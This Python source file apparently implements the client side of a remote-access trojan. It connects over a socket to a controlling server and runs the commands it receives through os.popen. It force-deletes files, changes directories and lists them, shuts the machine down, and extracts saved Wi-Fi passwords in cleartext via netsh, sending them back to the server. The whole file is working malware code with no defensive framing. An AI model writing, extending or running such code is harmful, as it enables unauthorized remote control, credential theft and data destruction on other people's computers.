import socket
import os
import subprocess
def mainapp():
    hostname = socket.gethostname()

    HOST = socket.gethostbyname(hostname)

    PORT = 9090
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    cmd_mode = False
    delete_mode = False
    ls_mode = False
    cd_mode = False

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send('Now you have a terminal access!'.encode('utf-8'))
            continue
        if server_command == 'delete-on':
            delete_mode = True
            client.send('Now you can remove the file or folder\n to turn off the command you must type [delete-off]'.encode('utf-8'))
            continue
        if server_command == 'cd-on':
            cd_mode = True
            client.send('Now you can jump to other folder or directory\n to turn of the command you must type[cd-off] '.encode('utf-8'))
            continue
        if server_command == 'ls-on':
            ls_mode = True
            client.send('Now you can see the directory or path \n to turn off the command you must type[ls-off]'.encode('utf-8'))
            continue
        if server_command == 'ls-off':
            ls_mode = False
        if server_command == 'cd-off':
            ls_mode = False
        if server_command == 'cmdoff':
            cmd_mode = False
        if server_command == 'delete-off':
            delete_mode = False
            client.send('You must turned it on again if you want to delete by typing [delete-on]'.encode('utf-8'))
        if cd_mode:
            os.chdir(server_command)
            client.send(f'{os.listdir()}'.encode('utf-8'))

        if ls_mode :
           client.send(f'{os.listdir()}'.encode('utf-8'))

        if delete_mode:
            os.popen(f'del /F /A {server_command}')
            client.send(f'{os.listdir}'.encode('utf-8'))

        if cmd_mode:
            os.popen(server_command)









        if server_command == "wifi":
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]


            for i in profiles:

                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i,
                                               'key=clear']).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                if bool(results) == False:
                    results = ['~No Password']




                client.send(f'{i} : {str(results)}\n'.encode('utf-8'))
        else:

            if server_command == 'hello':
                print('Hello There You Are Connected to my device ')


            if server_command == 'off':
                os.system('shutdown /s /t 0')

        client.send(f'{server_command} was executed successfully'.encode('utf-8'))